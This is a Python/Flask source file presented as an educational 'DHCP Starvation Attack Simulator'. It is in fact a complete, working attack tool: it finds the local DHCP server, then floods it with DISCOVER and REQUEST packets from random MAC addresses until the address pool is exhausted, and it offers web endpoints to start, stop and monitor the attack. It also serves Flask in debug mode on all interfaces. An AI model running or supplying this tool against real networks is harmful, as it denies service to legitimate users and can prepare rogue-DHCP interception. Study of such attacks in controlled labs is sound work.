#!/usr/bin/env python3
"""
DHCP Starvation Attack Simulator
Educational tool for cybersecurity students
Cross-platform version using psutil for Windows compatibility
"""

from flask import Flask, render_template, jsonify, request
from scapy.all import *
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
import threading
import time
import random
import os
import sys
import platform

# Try to import netifaces, fall back to psutil if not available
try:
    import netifaces
    USE_NETIFACES = True
except ImportError:
    import psutil
    USE_NETIFACES = False
    print("Note: Using psutil for network interface detection (netifaces not available)")

app = Flask(__name__)

# Global state
attack_running = False
attack_thread = None
stolen_ips = []
network_info = {}
stop_attack_flag = threading.Event()


def get_network_interfaces():
    """Get all available network interfaces (cross-platform)"""
    interfaces = []
    
    if USE_NETIFACES:
        # Use netifaces (Linux/macOS preferred)
        for iface in netifaces.interfaces():
            try:
                # Skip loopback (cross-platform)
                if iface in ['lo', 'lo0', 'Loopback Pseudo-Interface 1'] or 'loopback' in iface.lower():
                    continue
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    ip = addrs[netifaces.AF_INET][0]['addr']
                    interfaces.append({
                        'name': iface,
                        'ip': ip
                    })
            except:
                pass
    else:
        # Use psutil (Windows fallback)
        import psutil
        net_if_addrs = psutil.net_if_addrs()
        for iface_name, addr_list in net_if_addrs.items():
            # Skip loopback
            if 'loopback' in iface_name.lower():
                continue
            
            for addr in addr_list:
                if addr.family == 2:  # AF_INET (IPv4)
                    # Skip local addresses
                    if addr.address.startswith('127.'):
                        continue
                    interfaces.append({
                        'name': iface_name,
                        'ip': addr.address
                    })
                    break  # Only get first IPv4 address
    
    return interfaces


def discover_dhcp_server(interface):
    """Discover DHCP server on the network"""
    global network_info
    
    try:
        # Create DHCP discover packet
        mac = RandMAC()
        discover = (
            Ether(dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=mac) /
            DHCP(options=[("message-type", "discover"), "end"])
        )
        
        # Send and wait for response
        ans, _ = srp(discover, iface=interface, timeout=5, verbose=0)
        
        if ans:
            for _, rcv in ans:
                if DHCP in rcv:
                    dhcp_options = rcv[DHCP].options
                    server_ip = None
                    router_ip = None
                    subnet_mask = None
                    dhcp_pool_start = None
                    dhcp_pool_end = None
                    
                    for option in dhcp_options:
                        if isinstance(option, tuple):
                            if option[0] == 'server_id':
                                server_ip = option[1]
                            elif option[0] == 'router':
                                router_ip = option[1]
                            elif option[0] == 'subnet_mask':
                                subnet_mask = option[1]
                    
                    # Store network info
                    network_info = {
                        'server_ip': server_ip,
                        'router_ip': router_ip,
                        'subnet_mask': subnet_mask,
                        'dhcp_pool_start': rcv[BOOTP].yiaddr,
                        'dhcp_pool_end': 'Unknown (estimated from responses)'
                    }
                    
                    return server_ip
        
        return None
    except Exception as e:
        print(f"Error discovering DHCP: {e}")
        return None


def dhcp_starvation_attack(interface, dhcp_server):
    """Perform DHCP starvation attack"""
    global stolen_ips, attack_running, stop_attack_flag
    
    stop_attack_flag.clear()
    
    try:
        packet_count = 0
        while attack_running and not stop_attack_flag.is_set():
            # Generate random MAC address
            mac = RandMAC()
            
            # Create DHCP discover packet
            discover = (
                Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) /
                IP(src="0.0.0.0", dst="255.255.255.255") /
                UDP(sport=68, dport=67) /
                BOOTP(chaddr=mac, xid=random.randint(1, 900000000)) /
                DHCP(options=[("message-type", "discover"), "end"])
            )
            
            # Send discover and wait for offer
            ans, _ = srp(discover, iface=interface, timeout=2, verbose=0)
            
            for _, rcv in ans:
                if DHCP in rcv and BOOTP in rcv:
                    offered_ip = rcv[BOOTP].yiaddr
                    
                    # Send DHCP request for the offered IP
                    request = (
                        Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) /
                        IP(src="0.0.0.0", dst="255.255.255.255") /
                        UDP(sport=68, dport=67) /
                        BOOTP(chaddr=mac, xid=random.randint(1, 900000000)) /
                        DHCP(options=[
                            ("message-type", "request"),
                            ("requested_addr", offered_ip),
                            ("server_id", dhcp_server),
                            "end"
                        ])
                    )
                    
                    # Send request
                    srp(request, iface=interface, timeout=1, verbose=0)
                    
                    # Add to stolen IPs if not already present
                    ip_entry = {
                        'ip': offered_ip,
                        'mac': str(mac),
                        'time': time.strftime('%H:%M:%S')
                    }
                    
                    if not any(ip['ip'] == offered_ip for ip in stolen_ips):
                        stolen_ips.append(ip_entry)
                        packet_count += 1
            
            # Small delay to avoid overwhelming the network
            time.sleep(0.1)
            
            # Limit to 254 addresses
            if len(stolen_ips) >= 254:
                break
                
    except Exception as e:
        print(f"Attack error: {e}")
    finally:
        attack_running = False


@app.route('/')
def index():
    """Serve the main page"""
    return render_template('index.html')


@app.route('/api/interfaces')
def get_interfaces():
    """API endpoint to get network interfaces"""
    interfaces = get_network_interfaces()
    return jsonify(interfaces)


@app.route('/api/discover', methods=['POST'])
def discover():
    """API endpoint to discover DHCP server"""
    data = request.json
    interface = data.get('interface')
    
    if not interface:
        return jsonify({'error': 'Interface required'}), 400
    
    server_ip = discover_dhcp_server(interface)
    
    if server_ip:
        return jsonify({
            'server_ip': server_ip,
            'network_info': network_info
        })
    else:
        return jsonify({'error': 'DHCP server not found'}), 404


@app.route('/api/attack/start', methods=['POST'])
def start_attack():
    """API endpoint to start the attack"""
    global attack_running, attack_thread, stolen_ips
    
    data = request.json
    interface = data.get('interface')
    dhcp_server = data.get('dhcp_server')
    
    if not interface or not dhcp_server:
        return jsonify({'error': 'Interface and DHCP server required'}), 400
    
    if attack_running:
        return jsonify({'error': 'Attack already running'}), 400
    
    # Clear previous stolen IPs
    stolen_ips = []
    
    # Start attack in background thread
    attack_running = True
    attack_thread = threading.Thread(
        target=dhcp_starvation_attack,
        args=(interface, dhcp_server),
        daemon=True
    )
    attack_thread.start()
    
    return jsonify({'status': 'Attack started'})


@app.route('/api/attack/stop', methods=['POST'])
def stop_attack():
    """API endpoint to stop the attack"""
    global attack_running, stop_attack_flag
    
    if not attack_running:
        return jsonify({'error': 'No attack running'}), 400
    
    attack_running = False
    stop_attack_flag.set()
    
    return jsonify({'status': 'Attack stopped'})


@app.route('/api/attack/status')
def attack_status():
    """API endpoint to get attack status"""
    return jsonify({
        'running': attack_running,
        'stolen_ips': stolen_ips,
        'network_info': network_info
    })


def check_admin_privileges():
    """Check if script is running with admin/root privileges (cross-platform)"""
    if platform.system() == 'Windows':
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    else:
        # Unix/Linux/Mac
        return os.geteuid() == 0


if __name__ == '__main__':
    # Must run as root/admin for Scapy
    if not check_admin_privileges():
        print("ERROR: This script must be run with administrator/root privileges!")
        if platform.system() == 'Windows':
            print("Right-click PowerShell and 'Run as administrator' or use an elevated command prompt")
        else:
            print("Use: sudo python3 app.py")
        sys.exit(1)
    
    print(f"\nUsing {'netifaces' if USE_NETIFACES else 'psutil'} for network interface detection")
    print("Starting DHCP Starvation Attack Simulator...")
    print("Access the web interface at: http://localhost:5000\n")
    
    app.run(host='0.0.0.0', port=5000, debug=True)
